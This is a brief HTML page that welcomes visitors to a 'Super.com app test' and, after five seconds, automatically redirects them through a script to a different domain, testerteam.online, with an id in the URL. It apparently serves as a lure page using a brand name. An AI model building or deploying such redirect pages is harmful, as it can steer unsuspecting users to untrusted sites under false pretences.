<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Welcome to the Test</title>
  <style>
    body {
      background-color: #0d1117;
      color: #ffffff;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
      padding: 20px;
    }
    .message {
      font-size: 22px;
      animation: typing 1.8s steps(60, end) forwards;
      white-space: pre-line;
      overflow: hidden;
      border-right: 3px solid white;
    }
    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }
  </style>
  <script>
    setTimeout(function() {
      window.location.href = "https://testerteam.online/?aeb4623";
    }, 5000); // 5 ثواني قبل التوجيه
  </script>
</head>
<body>
  <div class="message">
    Welcome to the Super.com app test! 
    Get ready to start your journey. 
    We wish you the best experience!
  </div>
</body>
</html>
